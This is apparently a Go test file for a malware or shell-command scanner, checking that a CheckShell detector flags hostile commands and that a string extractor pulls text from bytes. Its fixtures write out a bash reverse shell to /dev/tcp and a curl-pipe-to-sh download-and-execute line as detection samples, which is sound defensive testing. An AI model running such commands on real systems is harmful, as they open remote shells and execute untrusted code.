package scanner

import "testing"

func TestCheckShell(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		input   string
		matched bool
	}{
		{name: "reverse shell", input: "bash -i >& /dev/tcp/8.8.8.8/4444 0>&1", matched: true},
		{name: "download execute", input: "curl -s http://1.2.3.4/a.sh | sh", matched: true},
		{name: "normal command", input: "ls -la /tmp", matched: false},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := CheckShell(tt.input); got != tt.matched {
				t.Fatalf("CheckShell(%q) = %v, want %v", tt.input, got, tt.matched)
			}
		})
	}
}

func TestExtractStrings(t *testing.T) {
	t.Parallel()

	data := []byte{0x00, 'h', 'e', 'l', 'l', 'o', 0x00, 'w', 'o', 'r', 'l', 'd', 0x00}
	got := ExtractStrings(data, 4, 32)
	if len(got) != 2 {
		t.Fatalf("expected 2 strings, got %d", len(got))
	}
	if got[0] != "hello" || got[1] != "world" {
		t.Fatalf("unexpected strings: %#v", got)
	}
}
